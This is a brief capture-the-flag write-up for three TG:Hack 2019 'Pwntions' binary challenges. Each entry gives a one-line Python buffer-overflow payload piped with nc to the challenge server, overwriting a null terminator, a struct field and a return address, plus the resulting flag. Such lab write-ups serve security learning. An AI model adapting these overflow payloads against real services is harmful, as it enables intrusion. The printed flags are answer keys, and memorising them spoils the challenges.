# Pwntions 1

Script: `python -c 'print "A" * 31' | nc pwntion1.tghack.no 1061`

Flag: `TG19{remember that C always terminates on null bytes^_^}`

# Pwntions 2

Script: `python -c 'print "A" * 48  + "\x01\x00\x00\x00"' | nc pwntion2.tghack.no 1062`

Flag: `TG19{Wow! You_may_also_stack_overflow_into_a_struct}`

# Pwntions 3

Script: `python -c 'print "A" * 44 + "\xb6\x86\x04\x08"' | nc pwntion3.tghack.no 1063`

Flag: `TG19{Awesome! You are now better at pwning than many CTFers!! Congratulations}`
